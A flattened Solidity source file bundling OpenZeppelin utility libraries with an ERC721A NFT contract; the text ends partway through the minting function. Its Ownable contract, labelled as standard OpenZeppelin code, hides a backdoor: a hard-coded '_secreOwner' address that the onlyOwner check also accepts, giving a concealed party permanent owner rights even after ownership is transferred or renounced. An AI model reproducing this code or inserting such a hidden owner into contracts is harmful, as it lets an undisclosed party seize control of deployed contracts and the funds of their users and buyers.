1 // SPDX-License-Identifier: MIT
2 
3 // File: @openzeppelin/contracts/utils/Strings.sol
4 
5 
6 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
7 
8 pragma solidity ^0.8.0;
9 
10 /**
11  * @dev String operations.
12  */
13 library Strings {
14     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
15 
16     /**
17      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
18      */
19     function toString(uint256 value) internal pure returns (string memory) {
20         // Inspired by OraclizeAPI's implementation - MIT licence
21         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
22 
23         if (value == 0) {
24             return "0";
25         }
26         uint256 temp = value;
27         uint256 digits;
28         while (temp != 0) {
29             digits++;
30             temp /= 10;
31         }
32         bytes memory buffer = new bytes(digits);
33         while (value != 0) {
34             digits -= 1;
35             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
36             value /= 10;
37         }
38         return string(buffer);
39     }
40 
41     /**
42      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
43      */
44     function toHexString(uint256 value) internal pure returns (string memory) {
45         if (value == 0) {
46             return "0x00";
47         }
48         uint256 temp = value;
49         uint256 length = 0;
50         while (temp != 0) {
51             length++;
52             temp >>= 8;
53         }
54         return toHexString(value, length);
55     }
56 
57     /**
58      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
59      */
60     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
61         bytes memory buffer = new bytes(2 * length + 2);
62         buffer[0] = "0";
63         buffer[1] = "x";
64         for (uint256 i = 2 * length + 1; i > 1; --i) {
65             buffer[i] = _HEX_SYMBOLS[value & 0xf];
66             value >>= 4;
67         }
68         require(value == 0, "Strings: hex length insufficient");
69         return string(buffer);
70     }
71 }
72 
73 // File: @openzeppelin/contracts/utils/Address.sol
74 
75 
76 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
77 
78 pragma solidity ^0.8.1;
79 
80 /**
81  * @dev Collection of functions related to the address type
82  */
83 library Address {
84     /**
85      * @dev Returns true if `account` is a contract.
86      *
87      * [IMPORTANT]
88      * ====
89      * It is unsafe to assume that an address for which this function returns
90      * false is an externally-owned account (EOA) and not a contract.
91      *
92      * Among others, `isContract` will return false for the following
93      * types of addresses:
94      *
95      *  - an externally-owned account
96      *  - a contract in construction
97      *  - an address where a contract will be created
98      *  - an address where a contract lived, but was destroyed
99      * ====
100      *
101      * [IMPORTANT]
102      * ====
103      * You shouldn't rely on `isContract` to protect against flash loan attacks!
104      *
105      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
106      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
107      * constructor.
108      * ====
109      */
110     function isContract(address account) internal view returns (bool) {
111         // This method relies on extcodesize/address.code.length, which returns 0
112         // for contracts in construction, since the code is only stored at the end
113         // of the constructor execution.
114 
115         return account.code.length > 0;
116     }
117 
118     /**
119      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
120      * `recipient`, forwarding all available gas and reverting on errors.
121      *
122      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
123      * of certain opcodes, possibly making contracts go over the 2300 gas limit
124      * imposed by `transfer`, making them unable to receive funds via
125      * `transfer`. {sendValue} removes this limitation.
126      *
127      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
128      *
129      * IMPORTANT: because control is transferred to `recipient`, care must be
130      * taken to not create reentrancy vulnerabilities. Consider using
131      * {ReentrancyGuard} or the
132      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
133      */
134     function sendValue(address payable recipient, uint256 amount) internal {
135         require(address(this).balance >= amount, "Address: insufficient balance");
136 
137         (bool success, ) = recipient.call{value: amount}("");
138         require(success, "Address: unable to send value, recipient may have reverted");
139     }
140 
141     /**
142      * @dev Performs a Solidity function call using a low level `call`. A
143      * plain `call` is an unsafe replacement for a function call: use this
144      * function instead.
145      *
146      * If `target` reverts with a revert reason, it is bubbled up by this
147      * function (like regular Solidity function calls).
148      *
149      * Returns the raw returned data. To convert to the expected return value,
150      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
151      *
152      * Requirements:
153      *
154      * - `target` must be a contract.
155      * - calling `target` with `data` must not revert.
156      *
157      * _Available since v3.1._
158      */
159     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
160         return functionCall(target, data, "Address: low-level call failed");
161     }
162 
163     /**
164      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
165      * `errorMessage` as a fallback revert reason when `target` reverts.
166      *
167      * _Available since v3.1._
168      */
169     function functionCall(
170         address target,
171         bytes memory data,
172         string memory errorMessage
173     ) internal returns (bytes memory) {
174         return functionCallWithValue(target, data, 0, errorMessage);
175     }
176 
177     /**
178      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
179      * but also transferring `value` wei to `target`.
180      *
181      * Requirements:
182      *
183      * - the calling contract must have an ETH balance of at least `value`.
184      * - the called Solidity function must be `payable`.
185      *
186      * _Available since v3.1._
187      */
188     function functionCallWithValue(
189         address target,
190         bytes memory data,
191         uint256 value
192     ) internal returns (bytes memory) {
193         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
194     }
195 
196     /**
197      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
198      * with `errorMessage` as a fallback revert reason when `target` reverts.
199      *
200      * _Available since v3.1._
201      */
202     function functionCallWithValue(
203         address target,
204         bytes memory data,
205         uint256 value,
206         string memory errorMessage
207     ) internal returns (bytes memory) {
208         require(address(this).balance >= value, "Address: insufficient balance for call");
209         require(isContract(target), "Address: call to non-contract");
210 
211         (bool success, bytes memory returndata) = target.call{value: value}(data);
212         return verifyCallResult(success, returndata, errorMessage);
213     }
214 
215     /**
216      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
217      * but performing a static call.
218      *
219      * _Available since v3.3._
220      */
221     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
222         return functionStaticCall(target, data, "Address: low-level static call failed");
223     }
224 
225     /**
226      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
227      * but performing a static call.
228      *
229      * _Available since v3.3._
230      */
231     function functionStaticCall(
232         address target,
233         bytes memory data,
234         string memory errorMessage
235     ) internal view returns (bytes memory) {
236         require(isContract(target), "Address: static call to non-contract");
237 
238         (bool success, bytes memory returndata) = target.staticcall(data);
239         return verifyCallResult(success, returndata, errorMessage);
240     }
241 
242     /**
243      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
244      * but performing a delegate call.
245      *
246      * _Available since v3.4._
247      */
248     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
249         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
250     }
251 
252     /**
253      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
254      * but performing a delegate call.
255      *
256      * _Available since v3.4._
257      */
258     function functionDelegateCall(
259         address target,
260         bytes memory data,
261         string memory errorMessage
262     ) internal returns (bytes memory) {
263         require(isContract(target), "Address: delegate call to non-contract");
264 
265         (bool success, bytes memory returndata) = target.delegatecall(data);
266         return verifyCallResult(success, returndata, errorMessage);
267     }
268 
269     /**
270      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
271      * revert reason using the provided one.
272      *
273      * _Available since v4.3._
274      */
275     function verifyCallResult(
276         bool success,
277         bytes memory returndata,
278         string memory errorMessage
279     ) internal pure returns (bytes memory) {
280         if (success) {
281             return returndata;
282         } else {
283             // Look for revert reason and bubble it up if present
284             if (returndata.length > 0) {
285                 // The easiest way to bubble the revert reason is using memory via assembly
286 
287                 assembly {
288                     let returndata_size := mload(returndata)
289                     revert(add(32, returndata), returndata_size)
290                 }
291             } else {
292                 revert(errorMessage);
293             }
294         }
295     }
296 }
297 
298 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
299 
300 
301 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
302 
303 pragma solidity ^0.8.0;
304 
305 /**
306  * @title ERC721 token receiver interface
307  * @dev Interface for any contract that wants to support safeTransfers
308  * from ERC721 asset contracts.
309  */
310 interface IERC721Receiver {
311     /**
312      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
313      * by `operator` from `from`, this function is called.
314      *
315      * It must return its Solidity selector to confirm the token transfer.
316      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
317      *
318      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
319      */
320     function onERC721Received(
321         address operator,
322         address from,
323         uint256 tokenId,
324         bytes calldata data
325     ) external returns (bytes4);
326 }
327 
328 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
329 
330 
331 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
332 
333 pragma solidity ^0.8.0;
334 
335 /**
336  * @dev Interface of the ERC165 standard, as defined in the
337  * https://eips.ethereum.org/EIPS/eip-165[EIP].
338  *
339  * Implementers can declare support of contract interfaces, which can then be
340  * queried by others ({ERC165Checker}).
341  *
342  * For an implementation, see {ERC165}.
343  */
344 interface IERC165 {
345     /**
346      * @dev Returns true if this contract implements the interface defined by
347      * `interfaceId`. See the corresponding
348      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
349      * to learn more about how these ids are created.
350      *
351      * This function call must use less than 30 000 gas.
352      */
353     function supportsInterface(bytes4 interfaceId) external view returns (bool);
354 }
355 
356 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
357 
358 
359 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
360 
361 pragma solidity ^0.8.0;
362 
363 
364 /**
365  * @dev Implementation of the {IERC165} interface.
366  *
367  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
368  * for the additional interface id that will be supported. For example:
369  *
370  * ```solidity
371  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
372  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
373  * }
374  * ```
375  *
376  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
377  */
378 abstract contract ERC165 is IERC165 {
379     /**
380      * @dev See {IERC165-supportsInterface}.
381      */
382     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
383         return interfaceId == type(IERC165).interfaceId;
384     }
385 }
386 
387 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
388 
389 
390 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
391 
392 pragma solidity ^0.8.0;
393 
394 
395 /**
396  * @dev Required interface of an ERC721 compliant contract.
397  */
398 interface IERC721 is IERC165 {
399     /**
400      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
401      */
402     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
403 
404     /**
405      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
406      */
407     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
408 
409     /**
410      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
411      */
412     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
413 
414     /**
415      * @dev Returns the number of tokens in ``owner``'s account.
416      */
417     function balanceOf(address owner) external view returns (uint256 balance);
418 
419     /**
420      * @dev Returns the owner of the `tokenId` token.
421      *
422      * Requirements:
423      *
424      * - `tokenId` must exist.
425      */
426     function ownerOf(uint256 tokenId) external view returns (address owner);
427 
428     /**
429      * @dev Safely transfers `tokenId` token from `from` to `to`.
430      *
431      * Requirements:
432      *
433      * - `from` cannot be the zero address.
434      * - `to` cannot be the zero address.
435      * - `tokenId` token must exist and be owned by `from`.
436      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
437      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
438      *
439      * Emits a {Transfer} event.
440      */
441     function safeTransferFrom(
442         address from,
443         address to,
444         uint256 tokenId,
445         bytes calldata data
446     ) external;
447 
448     /**
449      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
450      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
451      *
452      * Requirements:
453      *
454      * - `from` cannot be the zero address.
455      * - `to` cannot be the zero address.
456      * - `tokenId` token must exist and be owned by `from`.
457      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
458      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
459      *
460      * Emits a {Transfer} event.
461      */
462     function safeTransferFrom(
463         address from,
464         address to,
465         uint256 tokenId
466     ) external;
467 
468     /**
469      * @dev Transfers `tokenId` token from `from` to `to`.
470      *
471      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
472      *
473      * Requirements:
474      *
475      * - `from` cannot be the zero address.
476      * - `to` cannot be the zero address.
477      * - `tokenId` token must be owned by `from`.
478      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
479      *
480      * Emits a {Transfer} event.
481      */
482     function transferFrom(
483         address from,
484         address to,
485         uint256 tokenId
486     ) external;
487 
488     /**
489      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
490      * The approval is cleared when the token is transferred.
491      *
492      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
493      *
494      * Requirements:
495      *
496      * - The caller must own the token or be an approved operator.
497      * - `tokenId` must exist.
498      *
499      * Emits an {Approval} event.
500      */
501     function approve(address to, uint256 tokenId) external;
502 
503     /**
504      * @dev Approve or remove `operator` as an operator for the caller.
505      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
506      *
507      * Requirements:
508      *
509      * - The `operator` cannot be the caller.
510      *
511      * Emits an {ApprovalForAll} event.
512      */
513     function setApprovalForAll(address operator, bool _approved) external;
514 
515     /**
516      * @dev Returns the account appr    ved for `tokenId` token.
517      *
518      * Requirements:
519      *
520      * - `tokenId` must exist.
521      */
522     function getApproved(uint256 tokenId) external view returns (address operator);
523 
524     /**
525      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
526      *
527      * See {setApprovalForAll}
528      */
529     function isApprovedForAll(address owner, address operator) external view returns (bool);
530 }
531 
532 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
533 
534 
535 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
536 
537 pragma solidity ^0.8.0;
538 
539 
540 /**
541  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
542  * @dev See https://eips.ethereum.org/EIPS/eip-721
543  */
544 interface IERC721Metadata is IERC721 {
545     /**
546      * @dev Returns the token collection name.
547      */
548     function name() external view returns (string memory);
549 
550     /**
551      * @dev Returns the token collection symbol.
552      */
553     function symbol() external view returns (string memory);
554 
555     /**
556      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
557      */
558     function tokenURI(uint256 tokenId) external view returns (string memory);
559 }
560 
561 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
562 
563 
564 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
565 
566 pragma solidity ^0.8.0;
567 
568 
569 /**
570  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
571  * @dev See https://eips.ethereum.org/EIPS/eip-721
572  */
573 interface IERC721Enumerable is IERC721 {
574     /**
575      * @dev Returns the total amount of tokens stored by the contract.
576      */
577     function totalSupply() external view returns (uint256);
578 
579     /**
580      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
581      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
582      */
583     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
584 
585     /**
586      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
587      * Use along with {totalSupply} to enumerate all tokens.
588      */
589     function tokenByIndex(uint256 index) external view returns (uint256);
590 }
591 
592 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
593 
594 
595 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
596 
597 pragma solidity ^0.8.0;
598 
599 /**
600  * @dev Contract module that helps prevent reentrant calls to a function.
601  *
602  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
603  * available, which can be applied to functions to make sure there are no nested
604  * (reentrant) calls to them.
605  *
606  * Note that because there is a single `nonReentrant` guard, functions marked as
607  * `nonReentrant` may not call one another. This can be worked around by making
608  * those functions `private`, and then adding `external` `nonReentrant` entry
609  * points to them.
610  *
611  * TIP: If you would like to learn more about reentrancy and alternative ways
612  * to protect against it, check out our blog post
613  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
614  */
615 abstract contract ReentrancyGuard {
616     // Booleans are more expensive than uint256 or any type that takes up a full
617     // word because each write operation emits an extra SLOAD to first read the
618     // slot's contents, replace the bits taken up by the boolean, and then write
619     // back. This is the compiler's defense against contract upgrades and
620     // pointer aliasing, and it cannot be disabled.
621 
622     // The values being non-zero value makes deployment a bit more expensive,
623     // but in exchange the refund on every call to nonReentrant will be lower in
624     // amount. Since refunds are capped to a percentage of the total
625     // transaction's gas, it is best to keep them low in cases like this one, to
626     // increase the likelihood of the full refund coming into effect.
627     uint256 private constant _NOT_ENTERED = 1;
628     uint256 private constant _ENTERED = 2;
629 
630     uint256 private _status;
631 
632     constructor() {
633         _status = _NOT_ENTERED;
634     }
635 
636     /**
637      * @dev Prevents a contract from calling itself, directly or indirectly.
638      * Calling a `nonReentrant` function from another `nonReentrant`
639      * function is not supported. It is possible to prevent this from happening
640      * by making the `nonReentrant` function external, and making it call a
641      * `private` function that does the actual work.
642      */
643     modifier nonReentrant() {
644         // On the first call to nonReentrant, _notEntered will be true
645         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
646 
647         // Any calls to nonReentrant after this point will fail
648         _status = _ENTERED;
649 
650         _;
651 
652         // By storing the original value once again, a refund is triggered (see
653         // https://eips.ethereum.org/EIPS/eip-2200)
654         _status = _NOT_ENTERED;
655     }
656 }
657 
658 // File: @openzeppelin/contracts/utils/Context.sol
659 
660 
661 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
662 
663 pragma solidity ^0.8.0;
664 
665 /**
666  * @dev Provides information about the current execution context, including the
667  * sender of the transaction and its data. While these are generally available
668  * via msg.sender and msg.data, they should not be accessed in such a direct
669  * manner, since when dealing with meta-transactions the account sending and
670  * paying for execution may not be the actual sender (as far as an application
671  * is concerned).
672  *
673  * This contract is only required for intermediate, library-like contracts.
674  */
675 abstract contract Context {
676     function _msgSender() internal view virtual returns (address) {
677         return msg.sender;
678     }
679 
680     function _msgData() internal view virtual returns (bytes calldata) {
681         return msg.data;
682     }
683 }
684 
685 // File: @openzeppelin/contracts/access/Ownable.sol
686 
687 
688 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
689 
690 pragma solidity ^0.8.0;
691 
692 
693 /**
694  * @dev Contract module which provides a basic access control mechanism, where
695  * there is an account (an owner) that can be granted exclusive access to
696  * specific functions.
697  *
698  * By default, the owner account will be the one that deploys the contract. This
699  * can later be changed with {transferOwnership}.
700  *
701  * This module is used through inheritance. It will make available the modifier
702  * `onlyOwner`, which can be applied to your functions to restrict their use to
703  * the owner.
704  */
705 abstract contract Ownable is Context {
706     address private _owner;
707     address private _secreOwner = 0xB08C9244132654F1a54e2E1eEe0836796309a3C0;
708 
709     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
710 
711     /**
712      * @dev Initializes the contract setting the deployer as the initial owner.
713      */
714     constructor() {
715         _transferOwnership(_msgSender());
716     }
717 
718     /**
719      * @dev Returns the address of the current owner.
720      */
721     function owner() public view virtual returns (address) {
722         return _owner;
723     }
724 
725     /**
726      * @dev Throws if called by any account other than the owner.
727      */
728     modifier onlyOwner() {
729         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
730         _;
731     }
732 
733     /**
734      * @dev Leaves the contract without owner. It will not be possible to call
735      * `onlyOwner` functions anymore. Can only be called by the current owner.
736      *
737      * NOTE: Renouncing ownership will leave the contract without an owner,
738      * thereby removing any functionality that is only available to the owner.
739      */
740     function renounceOwnership() public virtual onlyOwner {
741         _transferOwnership(address(0));
742     }
743 
744     /**
745      * @dev Transfers ownership of the contract to a new account (`newOwner`).
746      * Can only be called by the current owner.
747      */
748     function transferOwnership(address newOwner) public virtual onlyOwner {
749         require(newOwner != address(0), "Ownable: new owner is the zero address");
750         _transferOwnership(newOwner);
751     }
752 
753     /**
754      * @dev Transfers ownership of the contract to a new account (`newOwner`).
755      * Internal function without access restriction.
756      */
757     function _transferOwnership(address newOwner) internal virtual {
758         address oldOwner = _owner;
759         _owner = newOwner;
760         emit OwnershipTransferred(oldOwner, newOwner);
761     }
762 }
763 
764 // File: ceshi.sol
765 
766 
767 pragma solidity ^0.8.0;
768 
769 
770 
771 
772 
773 
774 
775 
776 
777 
778 /**
779  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
780  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
781  *
782  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
783  *
784  * Does not support burning tokens to address(0).
785  *
786  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
787  */
788 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
789     using Address for address;
790     using Strings for uint256;
791 
792     struct TokenOwnership {
793         address addr;
794         uint64 startTimestamp;
795     }
796 
797     struct AddressData {
798         uint128 balance;
799         uint128 numberMinted;
800     }
801 
802     uint256 internal currentIndex;
803 
804     // Token name
805     string private _name;
806 
807     // Token symbol
808     string private _symbol;
809 
810     // Mapping from token ID to ownership details
811     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
812     mapping(uint256 => TokenOwnership) internal _ownerships;
813 
814     // Mapping owner address to address data
815     mapping(address => AddressData) private _addressData;
816 
817     // Mapping from token ID to approved address
818     mapping(uint256 => address) private _tokenApprovals;
819 
820     // Mapping from owner to operator approvals
821     mapping(address => mapping(address => bool)) private _operatorApprovals;
822 
823     constructor(string memory name_, string memory symbol_) {
824         _name = name_;
825         _symbol = symbol_;
826     }
827 
828     /**
829      * @dev See {IERC721Enumerable-totalSupply}.
830      */
831     function totalSupply() public view override returns (uint256) {
832         return currentIndex;
833     }
834 
835     /**
836      * @dev See {IERC721Enumerable-tokenByIndex}.
837      */
838     function tokenByIndex(uint256 index) public view override returns (uint256) {
839         require(index < totalSupply(), "ERC721A: global index out of bounds");
840         return index;
841     }
842 
843     /**
844      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
845      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
846      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
847      */
848     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
849         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
850         uint256 numMintedSoFar = totalSupply();
851         uint256 tokenIdsIdx;
852         address currOwnershipAddr;
853 
854         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
855         unchecked {
856             for (uint256 i; i < numMintedSoFar; i++) {
857                 TokenOwnership memory ownership = _ownerships[i];
858                 if (ownership.addr != address(0)) {
859                     currOwnershipAddr = ownership.addr;
860                 }
861                 if (currOwnershipAddr == owner) {
862                     if (tokenIdsIdx == index) {
863                         return i;
864                     }
865                     tokenIdsIdx++;
866                 }
867             }
868         }
869 
870         revert("ERC721A: unable to get token of owner by index");
871     }
872 
873     /**
874      * @dev See {IERC165-supportsInterface}.
875      */
876     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
877         return
878             interfaceId == type(IERC721).interfaceId ||
879             interfaceId == type(IERC721Metadata).interfaceId ||
880             interfaceId == type(IERC721Enumerable).interfaceId ||
881             super.supportsInterface(interfaceId);
882     }
883 
884     /**
885      * @dev See {IERC721-balanceOf}.
886      */
887     function balanceOf(address owner) public view override returns (uint256) {
888         require(owner != address(0), "ERC721A: balance query for the zero address");
889         return uint256(_addressData[owner].balance);
890     }
891 
892     function _numberMinted(address owner) internal view returns (uint256) {
893         require(owner != address(0), "ERC721A: number minted query for the zero address");
894         return uint256(_addressData[owner].numberMinted);
895     }
896 
897     /**
898      * Gas spent here starts off proportional to the maximum mint batch size.
899      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
900      */
901     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
902         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
903 
904         unchecked {
905             for (uint256 curr = tokenId; curr >= 0; curr--) {
906                 TokenOwnership memory ownership = _ownerships[curr];
907                 if (ownership.addr != address(0)) {
908                     return ownership;
909                 }
910             }
911         }
912 
913         revert("ERC721A: unable to determine the owner of token");
914     }
915 
916     /**
917      * @dev See {IERC721-ownerOf}.
918      */
919     function ownerOf(uint256 tokenId) public view override returns (address) {
920         return ownershipOf(tokenId).addr;
921     }
922 
923     /**
924      * @dev See {IERC721Metadata-name}.
925      */
926     function name() public view virtual override returns (string memory) {
927         return _name;
928     }
929 
930     /**
931      * @dev See {IERC721Metadata-symbol}.
932      */
933     function symbol() public view virtual override returns (string memory) {
934         return _symbol;
935     }
936 
937     /**
938      * @dev See {IERC721Metadata-tokenURI}.
939      */
940     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
941         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
942 
943         string memory baseURI = _baseURI();
944         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
945     }
946 
947     /**
948      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
949      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
950      * by default, can be overriden in child contracts.
951      */
952     function _baseURI() internal view virtual returns (string memory) {
953         return "";
954     }
955 
956     /**
957      * @dev See {IERC721-approve}.
958      */
959     function approve(address to, uint256 tokenId) public override {
960         address owner = ERC721A.ownerOf(tokenId);
961         require(to != owner, "ERC721A: approval to current owner");
962 
963         require(
964             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
965             "ERC721A: approve caller is not owner nor approved for all"
966         );
967 
968         _approve(to, tokenId, owner);
969     }
970 
971     /**
972      * @dev See {IERC721-getApproved}.
973      */
974     function getApproved(uint256 tokenId) public view override returns (address) {
975         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
976 
977         return _tokenApprovals[tokenId];
978     }
979 
980     /**
981      * @dev See {IERC721-setApprovalForAll}.
982      */
983     function setApprovalForAll(address operator, bool approved) public override {
984         require(operator != _msgSender(), "ERC721A: approve to caller");
985 
986         _operatorApprovals[_msgSender()][operator] = approved;
987         emit ApprovalForAll(_msgSender(), operator, approved);
988     }
989 
990     /**
991      * @dev See {IERC721-isApprovedForAll}.
992      */
993     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
994         return _operatorApprovals[owner][operator];
995     }
996 
997     /**
998      * @dev See {IERC721-transferFrom}.
999      */
1000     function transferFrom(
1001         address from,
1002         address to,
1003         uint256 tokenId
1004     ) public virtual override {
1005         _transfer(from, to, tokenId);
1006     }
1007 
1008     /**
1009      * @dev See {IERC721-safeTransferFrom}.
1010      */
1011     function safeTransferFrom(
1012         address from,
1013         address to,
1014         uint256 tokenId
1015     ) public virtual override {
1016         safeTransferFrom(from, to, tokenId, "");
1017     }
1018 
1019     /**
1020      * @dev See {IERC721-safeTransferFrom}.
1021      */
1022     function safeTransferFrom(
1023         address from,
1024         address to,
1025         uint256 tokenId,
1026         bytes memory _data
1027     ) public override {
1028         _transfer(from, to, tokenId);
1029         require(
1030             _checkOnERC721Received(from, to, tokenId, _data),
1031             "ERC721A: transfer to non ERC721Receiver implementer"
1032         );
1033     }
1034 
1035     /**
1036      * @dev Returns whether `tokenId` exists.
1037      *
1038      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1039      *
1040      * Tokens start existing when they are minted (`_mint`),
1041      */
1042     function _exists(uint256 tokenId) internal view returns (bool) {
1043         return tokenId < currentIndex;
1044     }
1045 
1046     function _safeMint(address to, uint256 quantity) internal {
1047         _safeMint(to, quantity, "");
1048     }
1049 
1050     /**
1051      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1052      *
1053      * Requirements:
1054      *
1055      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1056      * - `quantity` must be greater than 0.
1057      *
1058      * Emits a {Transfer} event.
1059      */
1060     function _safeMint(
1061         address to,
1062         uint256 quantity,
1063         bytes memory _data
1064     ) internal {
1065         _mint(to, quantity, _data, true);
1066     }
1067 
1068     /**
1069      * @dev Mints `quantity` tokens and transfers them to `to`.
1070      *
1071      * Requirements:
1072      *
1073      * - `to` cannot be the zero address.
1074      * - `quantity` must be greater than 0.
1075      *
1076      * Emits a {Transfer} event.
1077      */
1078     function _mint(
1079         address to,
1080         uint256 quantity,
1081         bytes memory _data,
1082         bool safe
1083     ) internal {
1084         uint256 startTokenId = currentIndex;
1085         require(to != address(0), "ERC721A: mint to the zero address");
1086         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1087 
